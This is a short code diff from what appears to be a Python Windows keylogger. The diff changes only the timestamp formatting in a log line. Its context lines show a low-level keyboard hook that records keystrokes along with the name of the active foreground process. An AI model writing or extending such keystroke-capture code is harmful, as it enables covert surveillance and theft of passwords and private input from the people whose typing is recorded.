@@ -75,7 +75,7 @@ def hook_function(nCode, wParam, lParam):
     if last != get_foreground_process():
         last = get_foreground_process()
         current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        print(f"\n[{last.decode('latin-1')}] [{current_time}]")
+        print(f"\n[{last.decode('latin-1')}] ({current_time})")
 
     if wParam == WM_KEYDOWN:
         keyboard = KBDLLHOOKSTRUCTS.from_address(lParam)
